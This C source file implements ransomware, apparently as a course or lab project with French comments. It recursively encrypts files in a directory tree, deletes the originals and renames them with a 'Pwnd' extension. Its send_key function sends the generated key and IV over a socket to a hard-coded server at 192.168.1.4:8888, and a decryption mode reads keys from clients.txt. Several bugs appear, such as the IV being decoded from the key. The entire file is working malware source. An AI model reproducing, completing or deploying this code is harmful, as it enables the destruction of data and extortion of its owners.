#include "ransomlib.h"
#include <dirent.h>

#include <openssl/rand.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>

#define OPENSSL_KEY_SIZE (256 / 8) //car Rand_bytes génère des bytes (octets) et pas bits
#define OPENSSL_IV_SIZE (128 / 8)
#define MAX_FILE_SIZE 1000000 //1Mb max
#define SIZE 1024

void usage();
int file_too_big(char *filename);
int is_encrypted(char *path);
void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);
int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
int send_key(char *pKey, char *pIv);

void usage(void){
    printf("Options :\n\n");
    printf("    -h          Display the help of the software.\n");
    printf("    -c          Execute the software in encryption mode.\n");
    printf("                It'll generate a key and iv that'll be sent\n");
	printf("                automatically to the server. This command must\n");
	printf("                be followed by -f.\n");
	printf("    -d          Execute the software in decryption mode.\n");
	printf("                This command must be followed in order by -f, \n");
	printf("                -k and -v arguments.\n");
    printf("    -f          Must be after -c or -d, must be followed by the\n");
    printf("                start folder of the tree to encrypt or decrypt.\n");
	printf("    -k          Must be after -a and his address, must be\n");
    printf("                followed by the right key.\n");
    printf("    -v          Must be after -k and his key, must be\n");
    printf("                followed by the right initialisation vector.\n");
	printf("    -a          Must be after -f and his adress. This auto\n");
	printf("                decrypt the target tree if the file 'clients.txt'.\n");
	printf("                is in the same folder.\n\n");

    printf("exemples of encrypting :\n\n");
    printf("    -c -f {root folder of the tree}\n\n");

    printf("exemples of decrypting :\n\n");
    printf("    -d -f {root folder of the tree} -k {key} -v {initialisation vector}\n\n");

	printf("exemples of auto decrypting :\n\n");
    printf("    -d -f {root folder of the tree} -a\n\n");
}

int file_too_big(char *filename){
	FILE* file = fopen(filename, "r");

	//Va à la fin du fichier et calcul son volume
	fseek(file, 0L, SEEK_END);
	long int result = ftell(file);

	if(result >= MAX_FILE_SIZE){
		return 1;
	}

	return 0;

	fclose(file);
}

int is_encrypted(char *path){
	char filename[strlen(path)];
	
	strcpy(filename, path);
	char *token = strtok(filename, ".");

	while(token != NULL){
		if(strcmp(token, "Pwnd") == 0){
			return 1;
		}
		token = strtok(NULL, ".");
	}
	return 0;
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){
	DIR *dir;
	struct dirent *entry;

	char path[1024];//taille arbitraire
	dir = opendir(name);

	while((entry = readdir(dir)) != NULL){
		snprintf(path, sizeof(path), "%s/%s", name, entry -> d_name);

		if(entry -> d_type == DT_DIR){
			if(strcmp(entry -> d_name, ".") == 0 || strcmp(entry -> d_name, "..") == 0){
				continue;
			}
			listdir(path, iv, key, de_flag);
		}
		//Si fichier et non directory
		else{
			if(de_flag == 'c'){
				if(file_too_big(path) == 1){
					continue;
				}
				if(is_encrypted(path) == 1){
					printf("%s\n", path);
					continue;
				}
				encrypt(key, iv, path);
				remove(path);
			}
			else if(de_flag == 'd'){
				unsigned char key_binary[strlen(key) * 2];
				unsigned char iv_binary[strlen(iv) * 2];

				hexa_to_bytes(key, key_binary, (strlen(key) * 2));
				hexa_to_bytes(key, iv_binary, (strlen(iv) * 2));

				if(is_encrypted(path) == 0){
					continue;
				}
				printf("%s\n", path);
				decrypt(key_binary, iv_binary, path);
				remove(path);
			}
			else{
				printf("Wrong argument of encryption/decryption !\n");
			}
		}
	}

	closedir(dir);
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv, char *pKey, char *pIv){
	if (!RAND_bytes(key, OPENSSL_KEY_SIZE)) {
    	printf("OpenSSL reports a failure during key generation !");
	}
	if (!RAND_bytes(iv, OPENSSL_IV_SIZE)) {
    	printf("OpenSSL reports a failure during iv generation !");
	}

	bytes_to_hexa(key, pKey, OPENSSL_KEY_SIZE + 1);
	bytes_to_hexa(iv, pIv, OPENSSL_IV_SIZE + 1);
}

int send_key(char *pKey, char *pIv){
	int sockid;
	int server_port = 8888;
	char *server_ip = "192.168.1.4";

	sockid = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(server_port);
	server_addr.sin_addr.s_addr = inet_addr(server_ip);

	char msg[((OPENSSL_KEY_SIZE * 2) + (OPENSSL_IV_SIZE * 2) + 3)];
	snprintf(msg, sizeof(msg), "%s | %s", pKey, pIv);

	connect(sockid, (struct sockaddr *)&server_addr, sizeof(server_addr));
	printf("Connected on %s:%d\n", inet_ntoa(server_addr.sin_addr), server_addr.sin_port);

	send(sockid, (const char *)msg, strlen(msg), 0);
	
	//suppression de la cléf et de l'IV de la mémoire
	memset(msg, 0, sizeof(char));
	memset(pKey, 0, sizeof(char));
	memset(pIv, 0, sizeof(char));
}

int main (int argc, char * argv[]){
	unsigned char key[OPENSSL_KEY_SIZE + 1];
	unsigned char iv[OPENSSL_IV_SIZE + 1];

	char pKey[(OPENSSL_KEY_SIZE * 2) + 1];
	char pIv[(OPENSSL_IV_SIZE * 2) + 1];

	const char *name = "test_ransom";

	//possible actions
    if(argc > 1){
        if(strcmp(argv[1], "-c") == 0){
            if(strcmp(argv[2], "-f") == 0){
				generate_key(key, OPENSSL_KEY_SIZE, iv, OPENSSL_IV_SIZE, pKey, pIv);
				send_key(pKey, pIv);
				listdir(argv[3], iv, key, 'c');

				//suppression de la cléf et de l'IV de la mémoire
				memset(iv, 0, sizeof(char));
				memset(key, 0, sizeof(char));
			}
			else{
				printf("Argument is missing !");
			}
        }
        else if(strcmp(argv[1], "-d") == 0){
            if(strcmp(argv[2], "-f") == 0){
				if(	strcmp(argv[4], "-k") == 0 && strcmp(argv[6], "-v") == 0 && 
					strlen(argv[3]) > 0 && strlen(argv[5]) > 0 && strlen(argv[7]) > 0){
						listdir(argv[3], argv[7], argv[5], 'd');
				}
				else if(strcmp(argv[4], "-a") == 0 && strlen(argv[3]) > 0){
					char token_list[2][(OPENSSL_KEY_SIZE * 2) + 3];
					char buffer[SIZE];
					int i = 0;

					FILE* key_file = fopen("clients.txt", "r");
					fgets(buffer, SIZE, key_file);

					char *token = strtok(buffer, " | ");
					while(token != NULL){
						if(i > 0){
							strcpy(token_list[i - 1], token);
						}
						i++;

						token = strtok(NULL, " | ");
					}
					fclose(key_file);

					listdir(argv[3], token_list[1], token_list[0], 'd');
				}
				else{
					printf("Argument is missing !");
				}
			}
			else{
				printf("Argument is missing !");
			}
        }
        else if(strcmp(argv[1], "-h") == 0){
            usage();
        }
        else{
            printf("wrong argument gived !\n");
        }
    }
    else{
        printf("non argument gived !\n");
    }
}